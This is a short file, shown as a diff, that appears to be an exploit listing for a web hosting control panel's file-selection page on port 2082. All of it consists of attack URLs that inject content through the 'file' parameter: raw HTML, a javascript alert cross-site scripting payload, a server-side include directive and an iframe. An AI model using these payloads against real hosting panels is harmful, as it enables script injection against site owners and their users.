@@ -1,0 +1,11 @@
+[+] Exploit:
+http://[Target]:[Port]/[Dir]/x/files/select.html?dir=/&amp;file= &lt;h1&gt;&lt;b&gt;Your code here!!&lt;/b&gt;&lt;/h1&gt;
+
+[+] Javascript:
+http://[Target]:2082/frontend/x/files/select.html?dir=/&amp;file=&lt;IMG src=&quot;javascript:alert(&#039;yeah&#039;);&quot;&gt;
+
+[+] Server Side Inclusion
+http://[Target]:2082/frontend/x/files/select.html?dir=/&amp;file=&lt;!--#echo var=&quot;HTTP_REFERER&quot; --&gt;
+
+[+] HTML
+http://[Target]:2082/frontend/x/files/select.html?dir=/&amp;file=&lt;IFRAME SRC=&quot;index.html&quot;&gt;
